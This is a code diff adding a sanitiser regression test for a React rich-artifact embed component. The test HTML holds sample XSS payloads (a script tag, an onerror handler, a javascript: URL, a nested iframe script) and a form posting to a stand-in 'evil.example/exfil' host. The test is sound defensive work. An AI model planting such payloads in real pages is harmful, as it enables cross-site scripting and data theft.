@@ -60,6 +60,56 @@ describe("<RichArtifactEmbed>", () => {
     });
   });
 
+  it("strips script tags + on* handlers + javascript: URLs even if the server sanitiser ever lets one through", async () => {
+    // Belt-and-suspenders defence-in-depth. The broker's
+    // validateRichArtifactHTML should never let any of this reach us, but
+    // the client-side DOMPurify layer (Layer 2 in the mountArtifact trust
+    // comment) is what protects the parent origin when removing the
+    // iframe boundary. If this test regresses, the parent origin is
+    // exposed to an entire class of XSS bypasses.
+    const adversarial = `<!doctype html><html><head>
+<style>.x{color:red}</style>
+</head><body>
+<p id="ok">visible content</p>
+<script>window.__pwned = "broker-sanitizer-bypass"</script>
+<img src="x" onerror="window.__pwned2 = 'event-handler-bypass'">
+<a id="badlink" href="javascript:window.__pwned3='js-url-bypass'">click</a>
+<iframe srcdoc="<script>window.__pwned4='nested-iframe'</script>"></iframe>
+<object data="x.swf"></object>
+<form action="https://evil.example/exfil"><input name="x"></form>
+</body></html>`;
+
+    render(<RichArtifactEmbed title="Adversarial" html={adversarial} />);
+    const host = await screen.findByLabelText("Adversarial", {
+      selector: "rich-artifact-embed",
+    });
+    await waitFor(() => {
+      const shadow = (host as HTMLElement & { shadowRoot: ShadowRoot })
+        .shadowRoot;
+      // Benign content survives.
+      expect(shadow.querySelector("#ok")?.textContent).toBe("visible content");
+      // Script-bearing constructs are gone.
+      expect(shadow.querySelector("script")).toBeNull();
+      expect(shadow.querySelector("iframe")).toBeNull();
+      expect(shadow.querySelector("object")).toBeNull();
+      expect(shadow.querySelector("form")).toBeNull();
+      expect(shadow.querySelector("input")).toBeNull();
+      // Event handlers are stripped.
+      const img = shadow.querySelector("img");
+      expect(img?.getAttribute("onerror")).toBeNull();
+      // javascript: URL is removed from the anchor.
+      const link = shadow.querySelector("#badlink");
+      const href = link?.getAttribute("href") ?? "";
+      expect(href.toLowerCase().startsWith("javascript:")).toBe(false);
+    });
+    // None of the pwn flags were assigned — DOMPurify swallowed the script
+    // content during parse, so even the cloneNode path couldn't execute it.
+    expect((window as unknown as Record<string, string>).__pwned).toBeUndefined();
+    expect((window as unknown as Record<string, string>).__pwned2).toBeUndefined();
+    expect((window as unknown as Record<string, string>).__pwned3).toBeUndefined();
+    expect((window as unknown as Record<string, string>).__pwned4).toBeUndefined();
+  });
+
   it("re-mounts when the html prop changes", async () => {
     const { rerender } = render(
       <RichArtifactEmbed
